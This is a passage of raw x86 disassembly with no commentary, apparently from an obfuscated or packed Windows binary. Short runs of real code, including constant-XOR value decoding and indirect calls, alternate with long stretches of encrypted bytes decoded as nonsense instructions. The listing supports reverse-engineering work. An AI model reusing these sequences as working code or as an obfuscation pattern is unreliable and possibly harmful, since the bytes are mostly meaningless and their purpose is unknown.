  40524b:	adc    eax,0x54b9abd9
  405250:	or     BYTE PTR [ecx+0x7],dl
  405253:	xor    eax,ecx
  405255:	add    eax,0x32729b
  40525a:	mov    DWORD PTR [edx],eax
  40525c:	mov    eax,DWORD PTR [ebp+0x14]
  40525f:	mov    edx,DWORD PTR [ebp+0x10]
  405262:	mov    DWORD PTR [edx+0x4],eax
  405265:	mov    eax,DWORD PTR [ebp+0x18]
  405268:	mov    edx,DWORD PTR [ebp+0x10]
  40526b:	jmp    0x405478
  405270:	sar    DWORD PTR [edx+ebp*4],cl
  405273:	push   ebp
  405274:	mov    cl,0x71
  405276:	icebp  
  405277:	mov    eax,0xd68c6305
  40527c:	shl    BYTE PTR [edi],0x98
  40527f:	and    al,dh
  405281:	sub    al,0x7e
  405283:	jle    0x4052f3
  405285:	jg     0x405305
  405287:	jle    0x4052af
  405289:	jmp    0x4b7:0xe4a3d8b
  405290:	loopne 0x405309
  405292:	das    
  405293:	gs dec edx
  405295:	into   
  405296:	sub    eax,DWORD PTR [ebx]
  405298:	xchg   ebp,eax
  405299:	mov    ah,0xeb
  40529b:	sar    DWORD PTR [eiz*2+0x75314347],0x9f
  4052a3:	cmp    dh,BYTE PTR [ebp+ecx*4+0x68]
  4052a7:	gs mov esp,0xc3c3177c
  4052ad:	cmp    DWORD PTR [ecx-0x5],edi
  4052b0:	ds push 0x65aa0fb9
  4052b6:	jl     0x40532e
  4052b8:	ins    DWORD PTR es:[edi],dx
  4052b9:	daa    
  4052ba:	call   0xcbff:0x4fd39299
  4052c1:	test   eax,0x99203133
  4052c6:	or     BYTE PTR es:[edx-0x4ed5e1b7],ah
  4052cd:	xor    eax,DWORD PTR [edi-0x15d83312]
  4052d3:	out    dx,al
  4052d4:	fsubr  DWORD PTR [edi]
  4052d6:	sbb    dl,0x98
  4052d9:	or     DWORD PTR [edi-0x62],eax
  4052dc:	and    ecx,DWORD PTR [edi+0x180a0078]
  4052e2:	lods   eax,DWORD PTR ds:[esi]
  4052e3:	cmp    DWORD PTR [edi-0x148de79a],edx
  4052e9:	or     eax,DWORD PTR [esi+0xa]
  4052ec:	sbb    bl,BYTE PTR [esi+eiz*2-0x5ec1c05c]
  4052f3:	out    0x1b,eax
  4052f5:	inc    ebx
  4052f6:	inc    ecx
  4052f7:	xor    ebx,DWORD PTR [esi]
  4052f9:	sbb    edi,DWORD PTR [ebx-0x75718705]
  4052ff:	xor    DWORD PTR [edi+ecx*4+0x15c8e59e],eax
  405306:	cmp    al,0x5e
  405308:	scas   al,BYTE PTR es:[edi]
  405309:	sub    cl,dh
  40530b:	jmp    0x405374
  40530d:	or     cl,BYTE PTR [eax+0x2e]
  405310:	test   al,0xa0
  405312:	inc    edx
  405313:	cwde   
  405314:	push   ss
  405315:	call   0x500acb8
  40531a:	adc    DWORD PTR [edx+0x3d7f65cc],eax
  405320:	xchg   esi,eax
  405321:	rcl    DWORD PTR [esi+eax*1],1
  405324:	cmp    al,BYTE PTR [edx+0x22]
  405327:	and    edx,ebp
  405329:	outs   dx,BYTE PTR ds:[esi]
  40532a:	mov    DWORD PTR [eax+0x362e9e48],edx
  405330:	lds    esi,FWORD PTR [ebx+ebp*1-0x759bfab8]
  405337:	inc    esp
  405338:	mov    BYTE PTR [ebx+0x41],bh
  40533b:	in     eax,dx
  40533c:	idiv   DWORD PTR [ecx]
  40533e:	cmp    DWORD PTR [edx-0x6f],esi
  405341:	pop    ds
  405342:	sti    
  405343:	fisubr DWORD PTR [edx]
  405345:	sub    BYTE PTR [ebx],0xb6
  405348:	and    dl,0xeb
  40534b:	dec    ebp
  40534c:	mov    al,0xb1
  40534e:	push   edx
  40534f:	pop    edi
  405350:	sub    al,BYTE PTR [ebx]
  405352:	mov    ecx,0x262cf285
  405357:	test   BYTE PTR [edx*1-0x581640c6],cl
  40535e:	mov    edx,0xc150e05
  405363:	mov    bh,0xc3
  405365:	sbb    bl,0xe8
  405368:	inc    esp
  405369:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40536a:	or     eax,0x3474f8cc
  40536f:	clc    
  405370:	dec    esp
  405371:	dec    esp
  405372:	add    eax,0x49cd27ea
  405377:	loope  0x405386
  405379:	fnstenv [esi]
  40537b:	fcmovnu st,st(6)
  40537d:	add    ebp,DWORD PTR [esi+0x1c]
  405380:	or     DWORD PTR [ebp+0x5d],0x7c
  405384:	cmc    
  405385:	call   DWORD PTR [edx]
  405387:	fnsave [ebp-0x1d]
  40538a:	xor    eax,0x977b5bed
  40538f:	xchg   BYTE PTR [ebx-0x79374d50],bh
  405395:	dec    ebp
  405396:	push   esi
  405397:	xor    ecx,ebp
  405399:	sti    
  40539a:	test   eax,0xe163ca65
  40539f:	retf   0x8baa
  4053a2:	aaa    
  4053a3:	(bad)  
  4053a4:	mov    dl,0xb7
  4053a6:	pop    ds
  4053a7:	push   ss
  4053a8:	cdq    
  4053a9:	inc    ebx
  4053aa:	test   eax,0x931aeafb
  4053af:	inc    BYTE PTR [esi+esi*8+0x37]
  4053b3:	dec    edi
  4053b4:	clc    
  4053b5:	add    eax,0x3a817c3b
  4053ba:	jecxz  0x40537b
  4053bc:	lods   al,BYTE PTR ds:[esi]
  4053bd:	lock jno 0x405396
  4053c0:	push   cs
  4053c1:	mov    edi,0xf0cff360
  4053c6:	repz fstp DWORD PTR [ebx]
  4053c9:	les    ebp,FWORD PTR ds:0xc83c8c2f
  4053cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4053d0:	ret    0x90ba
  4053d3:	or     bl,dl
  4053d5:	dec    eax
  4053d6:	cmp    edx,DWORD PTR ds:0xdf553596
  4053dc:	cwde   
  4053dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4053de:	dec    eax
  4053df:	gs cli 
  4053e1:	fwait
  4053e2:	cli    
  4053e3:	loope  0x4053c5
  4053e5:	gs ret 
  4053e7:	loope  0x405406
  4053e9:	pop    eax
  4053ea:	inc    ecx
  4053eb:	retf   0x99e
  4053ee:	adc    ebp,DWORD PTR [eax-0x1b6036ef]
  4053f4:	push   ebp
  4053f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4053f6:	sub    al,0x8e
  4053f8:	push   ss
  4053f9:	sub    BYTE PTR [edi+eax*1+0x15df7d2f],dl
  405400:	jmp    0x40543b
  405402:	jl     0x4053b2
  405404:	sub    ecx,DWORD PTR [ebp-0x1f]
  405407:	add    bl,BYTE PTR [edx+0x6b]
  40540a:	mov    ecx,0xa1798f12
  40540f:	out    0xe3,eax
  405411:	(bad)  
  405413:	or     ch,BYTE PTR gs:[ecx+edi*2+0x2c]
  405418:	sbb    esp,DWORD PTR [ebx]
  40541a:	icebp  
  40541b:	xchg   ebx,eax
  40541c:	out    0xc5,eax
  40541e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40541f:	jnp    0x4053db
  405421:	cmp    al,ah
  405423:	xchg   BYTE PTR [edx+0x24],bl
  405426:	or     esp,ebx
  405428:	dec    ecx
  405429:	and    al,0xc
  40542b:	aas    
  40542c:	xchg   edx,eax
  40542d:	jmp    0xef01:0xbccd469e
  405434:	xor    BYTE PTR [ebx+0x42],0xb6
  405438:	mov    bh,0x8
  40543a:	popa   
  40543b:	retf   0x5b97
  40543e:	sub    BYTE PTR [esi+0x78],bh
  405441:	(bad)  
  405442:	push   ecx
  405443:	or     bh,BYTE PTR [ebx-0x3a899daa]
  405449:	mov    al,ds:0x5f6dc63d
  40544e:	bound  esi,QWORD PTR [esi+0x76]
  405451:	faddp  st(6),st
  405453:	push   ds
  405454:	scas   al,BYTE PTR es:[edi]
  405455:	and    DWORD PTR [esi],0xb6f2d179
  40545b:	or     ebx,DWORD PTR [edi+ecx*4-0x2d]
  40545f:	sub    eax,0x620fbf10
  405464:	mov    ecx,0xac973d12
  405469:	in     al,dx
  40546a:	cdq    
  40546b:	out    dx,al
  40546c:	jae    0x405451
  40546e:	add    al,BYTE PTR [ecx-0x594f1842]
  405474:	out    0xcd,al
  405476:	jg     0x4054aa
  405478:	mov    DWORD PTR [edx+0x8],eax
  40547b:	mov    eax,DWORD PTR [ebp+0x1c]
  40547e:	mov    edx,DWORD PTR [ebp+0x10]
  405481:	mov    DWORD PTR [edx+0xc],eax
  405484:	mov    eax,DWORD PTR [ebp+0x20]
  405487:	mov    edx,DWORD PTR [ebp+0x10]
  40548a:	mov    DWORD PTR [edx+0x10],eax
  40548d:	mov    eax,eax
  40548f:	mov    eax,DWORD PTR [ebp+0x14]
  405492:	test   eax,eax
  405494:	mov    eax,DWORD PTR [ebp+0x8]
  405497:	jne    0x4054a0
  40549d:	mov    eax,DWORD PTR [ebp+0xc]
  4054a0:	xor    eax,ecx
  4054a2:	add    eax,0x32729b
  4054a7:	leave  
  4054a8:	ret    0x1c
  4054ab:	push   ebp
  4054ac:	mov    ebp,esp
  4054ae:	sub    esp,0x78
  4054b1:	mov    eax,ds:0x4121a8
  4054b6:	mov    DWORD PTR [ebp-0x10],eax
  4054b9:	mov    eax,ds:0x4122b4
  4054be:	mov    DWORD PTR [ebp-0x30],eax
  4054c1:	mov    DWORD PTR [ebp-0xc],0xf89c8531
  4054c8:	mov    DWORD PTR [ebp-0x14],0xf89c8532
  4054cf:	mov    eax,ds:0x43035f
  4054d4:	sbb    DWORD PTR ds:0x4302c5,eax
  4054da:	mov    eax,DWORD PTR [ebp-0xc]
  4054dd:	xor    DWORD PTR ds:0x4302f1,0x5a75
  4054e7:	push   ebx
  4054e8:	push   esi
  4054e9:	push   edi
  4054ea:	or     DWORD PTR ds:0x4302d5,0x19e9
  4054f4:	mov    esi,0x7510854
  4054f9:	xor    eax,esi
  4054fb:	mov    edi,0x32729b
  405500:	add    eax,edi
  405502:	or     DWORD PTR ds:0x430363,0x57a7
  40550c:	mov    DWORD PTR [ebp-0x20],eax
  40550f:	mov    DWORD PTR [ebp-0x28],0xf89cb531
  405516:	and    DWORD PTR ds:0x4302d5,0x0
  405520:	jmp    0x405530
  405525:	mov    eax,ds:0x4302d5
  40552a:	inc    eax
  40552b:	mov    ds:0x4302d5,eax
  405530:	cmp    DWORD PTR ds:0x4302d5,0x1d
  405537:	jae    0x4057cb
  40553d:	cmp    DWORD PTR ds:0x4302d5,0x4
  405544:	jne    0x405555
  40554a:	push   0x35c7
  40554f:	call   DWORD PTR ds:0x42ea97
  405555:	cmp    DWORD PTR ds:0x4302d5,0x3
  40555c:	jne    0x40556d
  405562:	mov    eax,ds:0x4302d5
  405567:	inc    eax
  405568:	mov    ds:0x4302d5,eax
  40556d:	jmp    0x405525
  405572:	mov    DWORD PTR ds:0x4302f1,0x14
  40557c:	cmp    DWORD PTR ds:0x4302f1,0x0
  405583:	je     0x4057cb
  405589:	cmp    DWORD PTR ds:0x4302f1,0x2
  405590:	jne    0x4055a2
  405596:	push   DWORD PTR [ebp-0x20]
  405599:	push   DWORD PTR [ebp-0x20]
  40559c:	call   DWORD PTR ds:0x42e923
  4055a2:	cmp    DWORD PTR ds:0x4302f1,0x3
  4055a9:	jne    0x4055bd
  4055af:	xor    eax,eax
  4055b1:	xor    eax,DWORD PTR ds:0x4302f1
  4055b7:	dec    eax
  4055b8:	mov    ds:0x4302f1,eax
  4055bd:	mov    eax,ds:0x4302f1
  4055c2:	dec    eax
  4055c3:	mov    ds:0x4302f1,eax
  4055c8:	jmp    0x40557c
  4055cd:	or     DWORD PTR ds:0x42ec53,edi
  4055d3:	jmp    0x4057cb
  4055d8:	jl     0x405580
  4055da:	inc    bl
  4055dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4055dd:	jecxz  0x405620
  4055df:	popa   
  4055e0:	xor    eax,0x54a2c60a
  4055e5:	inc    esp
  4055e6:	mov    ds:0x7e2a365c,al
  4055eb:	jle    0x405642
  4055ed:	jg     0x40566d
  4055ef:	jle    0x4055ff
  4055f1:	ins    DWORD PTR es:[edi],dx
  4055f2:	or     DWORD PTR [ecx+0x2c],ebp
  4055f5:	fadd   QWORD PTR [eax+0x5761067b]
  4055fb:	push   esp
  4055fc:	xchg   BYTE PTR [ebp-0x13],dh
  4055ff:	ins    BYTE PTR es:[edi],dx
  405600:	(bad)  
  405601:	jns    0x405603
  405603:	xchg   edx,eax
  405604:	mov    ecx,0x7679232a
  405609:	cmp    esp,DWORD PTR [ebp+0x38]
  40560c:	pop    ebx
  40560d:	or     al,0x18
  40560f:	das    
  405610:	ret    0xe636
  405613:	xchg   ecx,eax
  405614:	shl    BYTE PTR [esi+0x4c175e1b],cl
  40561a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40561b:	lock daa 
  40561d:	push   esi
  40561e:	cmc    
  40561f:	or     eax,0x7106aec0
  405624:	out    0x51,al
  405626:	fld    TBYTE PTR [ebx-0x79]
  405629:	push   esi
  40562a:	mov    WORD PTR [ebx+0x79d497ad],es
  405630:	out    0x52,eax
  405632:	push   ss
  405633:	ins    DWORD PTR es:[edi],dx
  405634:	and    bh,al
  405636:	jmp    0x405676
  405638:	(bad)  
  405639:	xor    ch,cl
  40563b:	dec    ecx
  40563c:	mov    al,0x58
  40563e:	call   0xc7193146
  405643:	dec    ebp
  405644:	fadd   QWORD PTR [edx-0x29]
  405647:	ss pop esi
  405649:	adc    al,0x9b
  40564b:	inc    edi
  40564c:	sbb    esi,eax
  40564e:	arpl   WORD PTR [esi+ebx*8+0x79],cx
  405652:	dec    ebp
  405653:	xor    ch,ah
  405655:	cmp    ebx,edx
  405657:	adc    bl,BYTE PTR [ecx]
  405659:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40565a:	and    al,0x91
  40565c:	xor    dh,BYTE PTR [eax]
  40565e:	js     0x40566f
  405660:	in     eax,dx
  405661:	sbb    DWORD PTR [edi],ebp
  405663:	bound  ecx,QWORD PTR ds:0x8c8b5252
  405669:	mov    al,ds:0xde5b949e
  40566e:	sbb    eax,0xecd16782
  405673:	cmp    ecx,DWORD PTR [eax+0x22]
  405676:	icebp  
  405677:	fs daa 
  405679:	and    dh,ah
  40567b:	or     bh,BYTE PTR [eax-0x5985ffed]
  405681:	sub    BYTE PTR [eax+0x3f],0x71
  405685:	pop    esi
  405686:	xor    esp,DWORD PTR [ecx+0x65]
  405689:	cli    
  40568a:	ins    BYTE PTR es:[edi],dx
  40568b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40568c:	cmc    
  40568d:	dec    edx
  40568e:	push   0xace316a1
  405693:	pop    es
  405694:	sbb    DWORD PTR [edx],eax
  405696:	sub    BYTE PTR [edi-0x6b],ah
  405699:	push   ds
  40569a:	arpl   WORD PTR [edx+0x27be77f3],ax
  4056a0:	aad    0x38
  4056a2:	and    eax,0x21694c21
  4056a7:	add    eax,0x56ded4a1
  4056ac:	jno    0x405677
  4056ae:	inc    ecx
  4056af:	xlat   BYTE PTR ds:[ebx]
  4056b0:	scas   eax,DWORD PTR es:[edi]
  4056b1:	cmp    al,BYTE PTR [ecx+0x315c922]
  4056b7:	jle    0x4056af
  4056b9:	push   cs
  4056ba:	inc    edx
  4056bb:	retf   0x93e0
  4056be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4056bf:	jmp    0x5650:0x1ddfede4
  4056c6:	mov    ds:0xc53263a0,eax
  4056cb:	mov    DWORD PTR [ecx],edx
  4056cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056ce:	sub    bh,BYTE PTR [eax+0x4c]
  4056d1:	sub    cl,BYTE PTR [edi-0x65]
  4056d4:	outs   dx,DWORD PTR ds:[esi]
  4056d5:	sbb    BYTE PTR [edi+0x6a],0xfc
  4056d9:	cmp    eax,DWORD PTR [esp+ebp*8+0x70]
  4056dd:	(bad)  
  4056de:	pusha  
  4056df:	inc    ecx
  4056e0:	scas   eax,DWORD PTR es:[edi]
  4056e1:	fsubr  DWORD PTR ds:0x6238fb92
  4056e7:	jg     0x405736
  4056e9:	(bad)  
  4056ea:	xchg   edi,eax
  4056eb:	inc    eax
  4056ec:	enter  0xb633,0x32
  4056f0:	inc    esi
  4056f1:	retf   0x6dd8
  4056f4:	leave  
  4056f5:	dec    esp
  4056f6:	lods   eax,DWORD PTR ds:[esi]
  4056f7:	dec    esp
  4056f8:	push   0xecc08664
  4056fd:	imul   ebp,esi,0x25
  405700:	add    eax,0x68fcdb5e
  405705:	pop    edx
  405706:	fstp   DWORD PTR [ebx+0x3cb442cd]
  40570c:	adc    cl,BYTE PTR [eax+0x557b530b]
  405712:	or     al,0x37
  405714:	hlt    
  405715:	out    0x76,eax
  405717:	and    dh,BYTE PTR [ebx]
  405719:	sbb    BYTE PTR [ecx*8-0x4517d4a3],0xf1
  405721:	int3   
  405722:	pusha  
  405723:	mov    esi,0x82da9cff
  405728:	add    al,0x3
  40572a:	cmp    DWORD PTR [ebp+ebx*2+0x59],eax
  40572e:	mov    ebx,0x9a233d1f
  405733:	ja     0x4056c2
  405735:	push   ebp
  405736:	add    DWORD PTR [ebp-0xf5796dd],ebx
  40573c:	xchg   esi,eax
  40573d:	sbb    BYTE PTR [ebp+0x266b2088],ch
  405743:	push   edi
  405744:	jecxz  0x405770
  405746:	bound  eax,QWORD PTR [ebp+0x4d22212]
  40574c:	or     BYTE PTR [ebp-0x54d0a4e6],ch
  405752:	out    0x86,eax
  405754:	mov    ah,BYTE PTR [ebx-0x5671a1fe]
  40575a:	mov    ebx,0xca5d42ae
  40575f:	or     ebx,DWORD PTR [eax+0x55d940c6]
  405765:	arpl   WORD PTR [esi],di
  405767:	popf   
  405768:	ja     0x4057c2
  40576a:	jo     0x4057a7
  40576c:	(bad)  
  40576d:	out    dx,eax
  40576e:	or     eax,0x13a1e29b
  405773:	mov    BYTE PTR [ebx-0x49],ch
  405776:	dec    edi
  405777:	mov    dh,0xcb
  405779:	mov    ds:0x6bc00bc4,al
  40577e:	xchg   esp,eax
  40577f:	mul    DWORD PTR [edi-0x7d]
  405782:	imul   esi,DWORD PTR [eax-0x2756d4d9],0x3b
  405789:	rol    BYTE PTR [eax+0x7c],cl
  40578c:	outs   dx,BYTE PTR ds:[esi]
  40578d:	sub    eax,0x7512e245
  405792:	adc    BYTE PTR [eax+eax*2+0x7d],cl
  405796:	or     ecx,DWORD PTR [edx-0x40770855]
  40579c:	jnp    0x405755
  40579e:	push   0x39
  4057a0:	push   ecx
  4057a1:	(bad)
  4057a4:	call   0x5779aa7e
  4057a9:	(bad)  [ecx]
  4057ab:	inc    eax
  4057ac:	adc    al,0x20
  4057ae:	adc    BYTE PTR [ecx],al
  4057b0:	jne    0x405798
  4057b2:	xor    eax,0x9d01ad5d
  4057b7:	aam    0xeb
  4057b9:	push   eax
  4057ba:	ficom  WORD PTR [ecx]
  4057bc:	add    DWORD PTR [ebp-0x7a],eax
  4057bf:	cld    
  4057c0:	xchg   esi,eax
  4057c1:	mov    bl,0x56
  4057c3:	stc    
  4057c4:	(bad)  
  4057c5:	fisubr WORD PTR [edx+0x4275517c]
  4057cb:	mov    DWORD PTR [ebp-0x34],0xf89f0531
  4057d2:	mov    DWORD PTR ds:0x42ec5b,0x1a
  4057dc:	cmp    DWORD PTR ds:0x42ec5b,0x0
  4057e3:	je     0x405811
  4057e9:	cmp    DWORD PTR ds:0x42ec5b,0x29
  4057f0:	jne    0x4057ff
  4057f6:	push   DWORD PTR [ebp-0x24]
  4057f9:	call   DWORD PTR ds:0x42e857
  4057ff:	mov    eax,ds:0x42ec5b
  405804:	dec    eax
  405805:	mov    ds:0x42ec5b,eax
  40580a:	jmp    0x4057dc
  40580f:	neg    eax
  405811:	mov    DWORD PTR [ebp-0x2c],0xf89c85f1
  405818:	mov    eax,ds:0x42e648
  40581d:	or     DWORD PTR ds:0x4302c5,eax
  405823:	mov    DWORD PTR [ebp-0x24],0xf89c85d1
  40582a:	mov    eax,DWORD PTR [ebp-0xc]
  40582d:	and    DWORD PTR ds:0x4302b9,0x7e31
  405837:	xor    eax,esi
  405839:	add    eax,edi
  40583b:	mov    DWORD PTR [ebp-0x18],eax
  40583e:	sbb    DWORD PTR ds:0x42e654,0x48a8
  405848:	mov    DWORD PTR [ebp-0x1c],0xf89c853e
  40584f:	sub    eax,DWORD PTR ds:0x42ec6f
  405855:	mov    BYTE PTR [ebp-0x1],0x67
  405859:	mov    DWORD PTR ds:0x42ec5b,0x1c
  405863:	cmp    DWORD PTR ds:0x42ec5b,0x0
  40586a:	je     0x4058ae
  405870:	cmp    DWORD PTR ds:0x42ec5b,0xe
  405877:	jne    0x405886
  40587d:	push   DWORD PTR [ebp-0x18]
  405880:	call   DWORD PTR ds:0x42e85b
  405886:	cmp    DWORD PTR ds:0x42ec5b,0xf
  40588d:	jne    0x40589e
  405893:	mov    eax,ds:0x42ec5b
  405898:	dec    eax
  405899:	mov    ds:0x42ec5b,eax
  40589e:	mov    eax,ds:0x42ec5b
  4058a3:	dec    eax
  4058a4:	mov    ds:0x42ec5b,eax
  4058a9:	jmp    0x405863
  4058ae:	mov    eax,DWORD PTR [ebp-0xc]
  4058b1:	or     DWORD PTR ds:0x4302c1,0x42ec53
  4058bb:	xor    eax,esi
  4058bd:	add    eax,edi
  4058bf:	mov    DWORD PTR [ebp-0x18],eax
  4058c2:	mov    eax,DWORD PTR [ebp-0x24]
  4058c5:	sbb    DWORD PTR ds:0x4302b5,0x42e644
  4058cf:	xor    eax,esi
  4058d1:	sbb    DWORD PTR ds:0x430353,0xd15
  4058db:	add    eax,edi
  4058dd:	inc    DWORD PTR ds:0x4302dd
  4058e3:	push   eax
  4058e4:	xor    eax,eax
  4058e6:	xor    eax,DWORD PTR ds:0x4302bd
  4058ec:	xor    DWORD PTR ds:0x4302e1,eax
  4058f2:	mov    eax,DWORD PTR [ebp-0x28]
  4058f5:	sub    DWORD PTR ds:0x4302d1,0x42ec6f
  4058ff:	xor    eax,esi
  405901:	or     DWORD PTR ds:0x4302c1,0x42e648
  40590b:	add    eax,edi
  40590d:	push   eax
  40590e:	or     eax,DWORD PTR ds:0x4302c1
  405914:	mov    eax,DWORD PTR [ebp-0x1c]
  405917:	or     DWORD PTR ds:0x42ec53,0x39ed
  405921:	xor    eax,esi
  405923:	not    DWORD PTR ds:0x42ec6b
  405929:	add    eax,edi
  40592b:	adc    DWORD PTR ds:0x4302e9,0x43036b
  405935:	push   eax
  405936:	sbb    DWORD PTR ds:0x4302e9,0x42e648
  405940:	lea    eax,[ebp-0x78]
  405943:	push   eax
  405944:	dec    DWORD PTR ds:0x430353
  40594a:	push   DWORD PTR [ebp-0xc]
  40594d:	sub    DWORD PTR ds:0x430353,0x42e654
  405957:	push   DWORD PTR [ebp-0x14]
  40595a:	and    DWORD PTR ds:0x4302bd,0x42ec5b
  405964:	call   0x4046ad
  405969:	test   eax,eax
  40596b:	je     0x405da5
  405971:	lea    eax,[ebp-0x78]
  405974:	sbb    DWORD PTR ds:0x42ec4f,0x42ec6b
  40597e:	push   eax
  40597f:	movzx  eax,BYTE PTR ds:0x4302d5
  405986:	sbb    eax,DWORD PTR ds:0x4302ed
  40598c:	mov    ds:0x4302d5,eax
  405991:	jmp    0x405b89
  405996:	xor    DWORD PTR [ecx+0x5c],esi
  405999:	sbb    eax,0x7171315c
  40599e:	repnz fistp WORD PTR [esi-0x48]
  4059a2:	jb     0x405948
  4059a4:	inc    ebp
  4059a5:	or     BYTE PTR ds:0x557e7e28,0x7f
  4059ac:	jle    0x405a2c
  4059ae:	push   0xca118d81
  4059b3:	inc    esp
  4059b4:	ja     0x405a2c
  4059b6:	stos   BYTE PTR es:[edi],al
  4059b7:	dec    ebx
  4059b8:	in     al,0xe4
  4059ba:	test   al,0xaa
  4059bc:	icebp  
  4059bd:	(bad)  
  4059be:	sbb    edx,edx
  4059c0:	inc    esi
  4059c1:	enter  0x894d,0x52
  4059c5:	fisub  WORD PTR [esi+eax*1+0x41983814]
  4059cc:	mov    ch,0x1f
  4059ce:	ja     0x4059c3
  4059d0:	mov    bh,0x6a
  4059d2:	add    dh,BYTE PTR [esi-0x32]
  4059d5:	adc    al,0xb4
  4059d7:	add    al,0x5e
  4059d9:	mov    ds:0x40436ed6,eax
  4059de:	pushf  
  4059df:	mov    ebp,DWORD PTR [ecx+0x4aaea846]
  4059e5:	bound  esi,QWORD PTR [edi]
  4059e7:	fs jl  0x4059dc
  4059ea:	xchg   esi,eax
  4059eb:	ret    0xdfc4
  4059ee:	js     0x405a6f
  4059f0:	arpl   WORD PTR [edx],dx
  4059f2:	ins    DWORD PTR es:[edi],dx
  4059f3:	in     al,0x59
  4059f5:	xchg   DWORD PTR ds:0x5e5c23dc,ebp
  4059fb:	xor    ebp,edi
  4059fd:	xchg   edx,eax
  4059fe:	scas   al,BYTE PTR es:[edi]
  4059ff:	mov    ah,BYTE PTR [edi+eax*8+0x7abf96d8]
  405a06:	icebp  
  405a07:	das    
  405a08:	fcmovnb st,st(4)
  405a0a:	iret   
  405a0b:	adc    ebx,ecx
  405a0d:	cmp    al,0x5e
  405a0f:	clc    
  405a10:	inc    ecx
  405a11:	outs   dx,DWORD PTR ds:[esi]
  405a12:	dec    ebp
  405a13:	rol    DWORD PTR [eax-0x3ed7916b],cl
  405a19:	mov    dh,0xa0
  405a1b:	jb     0x405a2d
  405a1d:	cmp    DWORD PTR [ecx+0x9],eax
  405a20:	add    eax,0x81c2096
  405a25:	outs   dx,BYTE PTR ds:[esi]
  405a26:	jne    0x405a79
  405a28:	pop    esi
  405a29:	shl    BYTE PTR [bx+si+0x49],1
  405a2d:	or     eax,0xbe9a3dda
  405a32:	fwait
  405a33:	jne    0x405a8d
  405a35:	inc    eax
  405a36:	add    al,0xab
  405a38:	stos   BYTE PTR es:[edi],al
  405a39:	cmp    eax,0x8b08b50a
  405a3e:	sbb    DWORD PTR [edx],ebp
  405a40:	xor    ecx,ebx
  405a42:	test   DWORD PTR [ebx-0x65],ebp
  405a45:	ret    0x7bf5
  405a48:	add    esi,DWORD PTR [ebp-0x2c]
  405a4b:	mov    cl,0xb2
  405a4d:	add    ebx,0x1f
  405a50:	bound  ecx,QWORD PTR [esi+0x63]
  405a53:	cmp    eax,0xf1b1daa2
  405a58:	jl     0x4059f9
  405a5a:	mov    eax,0x73c6dd9c
  405a5f:	icebp  
  405a60:	loop   0x405ab7
  405a62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a63:	and    edx,ebx
  405a65:	or     al,0xff
  405a67:	adc    ebp,eax
  405a69:	push   eax
  405a6a:	ins    DWORD PTR es:[edi],dx
  405a6b:	adc    ch,BYTE PTR [ecx+0x40]
  405a6e:	ret    0xe7e9
  405a71:	inc    edx
  405a72:	lock pop ss
  405a74:	mov    edx,DWORD PTR [edi]
  405a76:	jg     0x405a48
  405a78:	xor    edi,DWORD PTR es:[edx+0x1ff229da]
  405a7f:	ret    
  405a80:	or     BYTE PTR [eax],ch
  405a82:	int    0x2e
  405a84:	lea    esi,[eax-0x201b060e]
  405a8a:	pop    eax
  405a8b:	jmp    0xaf5a:0xf4a7770c
  405a92:	ror    BYTE PTR [edx+eiz*8+0x31],1
  405a96:	in     eax,0xa1
  405a98:	sti    
  405a99:	(bad)  
  405a9a:	(bad)  
  405a9c:	sub    BYTE PTR [edx+0x38],bl
  405a9f:	xchg   edi,eax
  405aa0:	pop    esp
  405aa1:	js     0x405aed
  405aa3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405aa4:	arpl   WORD PTR [edx+eiz*8+0x5db7fb43],sp
  405aab:	push   0x5a605a08
  405ab0:	dec    esp
  405ab1:	popa   
  405ab2:	sub    eax,DWORD PTR [ecx-0x44]
  405ab5:	(bad)  
  405ab6:	adc    al,0x75
  405ab8:	adc    DWORD PTR [ecx],eax
  405aba:	fistp  WORD PTR [ebx-0x3dc833bd]
  405ac0:	ins    BYTE PTR es:[edi],dx
  405ac1:	jecxz  0x405ad3
  405ac3:	lods   al,BYTE PTR ds:[esi]
  405ac4:	icebp  
  405ac5:	arpl   di,cx
  405ac7:	in     al,dx
  405ac8:	inc    eax
  405ac9:	mov    bh,dl
  405acb:	adc    ah,cl
  405acd:	jb     0x405ae8
  405acf:	nop
  405ad0:	or     ch,BYTE PTR cs:[ebp+0x6b3721ba]
  405ad7:	pop    edi
  405ad8:	cld    
  405ad9:	test   BYTE PTR [ebp+0x3bcca182],bl
  405adf:	in     eax,dx
  405ae0:	inc    esi
  405ae1:	mov    bl,0xb6
  405ae3:	xchg   ebx,eax
  405ae4:	fcmovu st,st(4)
  405ae6:	cmp    edi,ebp
  405ae8:	jmp    0x405ad8
  405aea:	xchg   ecx,eax
  405aeb:	pop    edx
  405aec:	ds scas eax,DWORD PTR es:[edi]
  405aee:	aam    0x4e
  405af0:	dec    edi
  405af1:	stos   BYTE PTR es:[edi],al
  405af2:	aad    0x58
  405af4:	jg     0x405a78
  405af6:	mov    al,0xe1
  405af8:	jg     0x405aa8
  405afa:	add    BYTE PTR [esi],dh
  405afc:	adc    DWORD PTR [ebx+ebp*2],edi
  405aff:	push   ecx
  405b00:	xor    esp,edx
  405b02:	dec    ebp
  405b03:	xchg   ebp,eax
  405b04:	jns    0x405b30
  405b06:	in     al,0x23
  405b08:	data16 cmp cl,ch
  405b0b:	push   ebx
  405b0c:	mov    ds:0x3aaba801,al
  405b11:	sub    al,0x14
  405b13:	and    al,0xc3
  405b15:	mov    eax,ds:0xe9585417
  405b1a:	out    dx,eax
  405b1b:	ret    0x3b30
  405b1e:	pop    ebp
  405b1f:	mov    esi,0xdc179f70
  405b24:	dec    eax
  405b25:	pusha  
  405b26:	cwde   
  405b27:	loopne 0x405b36
  405b29:	fsubr  DWORD PTR [ecx-0x72]
  405b2c:	jo     0x405af3
  405b2e:	dec    esi
